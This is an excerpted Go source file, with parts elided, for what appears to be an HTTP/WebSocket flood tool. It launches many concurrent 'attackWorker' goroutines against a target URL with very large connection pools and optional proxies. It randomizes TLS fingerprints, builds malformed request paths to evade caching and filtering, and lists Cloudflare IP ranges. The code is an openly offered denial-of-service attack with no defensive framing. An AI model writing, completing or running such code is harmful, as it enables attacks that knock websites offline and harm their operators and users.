...
var (
	...
	cloudflareIPRanges = [][]string{
		...
		{"108.162.192", "108.162.255"},		{"104.16.0", "104.23.255"},
		{"172.64.0", "172.71.255"},
	}
...
func getRandomTLSProfile() *tls.Config {
	idx := randInt(0, len(tlsProfiles)-1)	return tlsProfiles[idx]
}
...
func getNextColor() string {
	...
	colorIndex = (colorIndex + 1) % len(colors)	return color
}
...
func generateAdvancedPath() string {
	...
	if randInt(1, 100) <= 20 {
		malforms := []string{			"/" + randomString(4) + "/../" + randomString(4),
			"/./" + randomString(6) + "/..",
			"//" + randomString(8),
...
func main() {
	...
	if mode == "WS" {
		...
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()				attackWorker(target, u.Host, mode, done, stats, useProxy)
			}(i)
		}
	}
...
func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	...
	if client == nil {
		tr := &http.Transport{
			TLSClientConfig:     getRandomTLSProfile(),
			MaxIdleConns:        4000,			MaxIdleConnsPerHost: 2000,
			IdleConnTimeout:     120 * time.Second,
			DisableKeepAlives:   false,
		}
		http2.ConfigureTransport(tr)
